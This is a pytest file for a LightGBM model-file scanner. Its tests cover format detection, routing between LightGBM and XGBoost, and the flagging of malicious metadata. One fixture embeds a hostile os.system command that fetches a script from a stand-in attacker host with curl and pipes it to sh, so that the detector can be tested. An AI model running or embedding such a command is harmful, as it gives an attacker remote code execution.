"""Tests for native LightGBM scanner and routing behavior."""

from __future__ import annotations

from pathlib import Path

from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import Check, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.lightgbm_scanner import LightGBMScanner
from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension, validate_file_type


def _build_lightgbm_text(extra_lines: list[str] | None = None) -> str:
    base_lines = [
        "tree",
        "version=v4",
        "num_class=1",
        "num_tree_per_iteration=1",
        "max_feature_idx=2",
        "feature_names=f0 f1 f2",
        "feature_infos=[0:1] [0:1] [0:1]",
        "tree_sizes=12",
        "Tree=0",
        "num_leaves=2",
        "split_feature=0",
        "split_gain=1.0",
        "threshold=0.5",
        "decision_type=<=",
        "left_child=-1",
        "right_child=-2",
        "leaf_value=0.1 0.2",
    ]
    if extra_lines:
        base_lines.extend(extra_lines)
    return "\n".join(base_lines) + "\n"


def _check_by_name(result: ScanResult, name: str) -> list[Check]:
    return [check for check in result.checks if check.name == name]


def test_can_handle_lightgbm_text_model(tmp_path: Path) -> None:
    path = tmp_path / "native.model"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    assert LightGBMScanner.can_handle(str(path))


def test_can_handle_lightgbm_binary_like_model(tmp_path: Path) -> None:
    path = tmp_path / "native.lgb"
    payload = b"\x00\x01\x02LGBM\x00" + _build_lightgbm_text().replace("\n", "\x00").encode("utf-8")
    path.write_bytes(payload)

    assert LightGBMScanner.can_handle(str(path))


def test_can_handle_rejects_xgboost_like_model_content(tmp_path: Path) -> None:
    path = tmp_path / "xgb.model"
    path.write_text('{"learner":{"gradient_booster":{"name":"gbtree","tree_param":{}}}}', encoding="utf-8")

    assert not LightGBMScanner.can_handle(str(path))


def test_scan_benign_lightgbm_model_avoids_critical_false_positives(tmp_path: Path) -> None:
    path = tmp_path / "benign.lightgbm"
    path.write_text(
        _build_lightgbm_text(
            [
                "feature_names=system_health execution_time_ms parse_metric",
                "parameters:",
                "[metric: l2]",
            ]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    assert result.success is True
    assert all(check.severity != IssueSeverity.CRITICAL for check in result.checks)

    command_checks = _check_by_name(result, "Command Indicator Check")
    assert len(command_checks) == 1
    assert command_checks[0].status == CheckStatus.PASSED


def test_scan_detects_command_and_network_correlation(tmp_path: Path) -> None:
    path = tmp_path / "malicious.model"
    path.write_text(
        _build_lightgbm_text(
            [
                "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')",
                "callback_url=https://collector.evil.example/payload.sh",
            ]
        ),
        encoding="utf-8",
    )

    result = LightGBMScanner().scan(str(path))

    command_checks = _check_by_name(result, "Command Indicator Check")
    assert len(command_checks) == 1
    assert command_checks[0].status == CheckStatus.FAILED
    assert command_checks[0].severity == IssueSeverity.CRITICAL

    network_checks = _check_by_name(result, "Network Indicator Check")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED

    correlation_checks = _check_by_name(result, "Command/Network Correlation Check")
    assert len(correlation_checks) == 1
    assert correlation_checks[0].status == CheckStatus.FAILED
    assert correlation_checks[0].severity == IssueSeverity.CRITICAL


def test_scan_corrupt_file_fails_signature_validation(tmp_path: Path) -> None:
    path = tmp_path / "corrupt.lgb"
    path.write_bytes(b"\x00\xff\x10\x00not-a-lightgbm-model")

    result = LightGBMScanner().scan(str(path))

    assert result.success is False
    signature_checks = _check_by_name(result, "LightGBM Signature Validation")
    assert len(signature_checks) == 1
    assert signature_checks[0].status == CheckStatus.FAILED


def test_routing_disambiguates_lightgbm_and_xgboost_model_extension(tmp_path: Path) -> None:
    lightgbm_path = tmp_path / "lightgbm.model"
    lightgbm_path.write_text(_build_lightgbm_text(), encoding="utf-8")

    xgboost_path = tmp_path / "xgboost.model"
    xgboost_path.write_bytes(b"gbtree\x00\x00\x01\x02")

    lightgbm_scanner = get_scanner_for_file(str(lightgbm_path))
    xgboost_scanner = get_scanner_for_file(str(xgboost_path))

    assert lightgbm_scanner is not None
    assert lightgbm_scanner.name == "lightgbm"

    assert xgboost_scanner is not None
    assert xgboost_scanner.name == "xgboost"


def test_detection_helpers_cover_lightgbm_extension(tmp_path: Path) -> None:
    path = tmp_path / "model.lgb"
    path.write_text(_build_lightgbm_text(), encoding="utf-8")

    assert detect_file_format(str(path)) == "lightgbm"
    assert detect_format_from_extension(str(path)) == "lightgbm"
    assert validate_file_type(str(path)) is True
